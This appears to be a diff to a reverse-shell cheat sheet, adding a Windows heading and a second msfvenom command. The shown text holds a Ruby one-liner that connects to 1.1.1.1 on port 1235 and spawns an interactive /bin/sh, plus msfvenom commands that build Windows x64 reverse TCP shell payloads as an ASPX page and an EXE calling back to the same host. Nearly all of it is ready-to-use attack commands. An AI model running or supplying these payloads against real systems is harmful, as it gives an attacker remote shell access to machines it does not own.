@@ -94,7 +94,10 @@ ruby -rsocket -e'f=TCPSocket.open("1.1.1.1",1235).to_i;exec sprintf("/bin/sh -i 
 ```
 
 ## msfvenom
-
+### Windows
 ```bash
 msfvenom -p windows/x64/shell_reverse_tcp lhost=1.1.1.1 lport=1235 -f aspx > shell.aspx
+```
+```bash
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=1.1.1.1 LPORT=1235 -f exe -o shell.exe
 ```
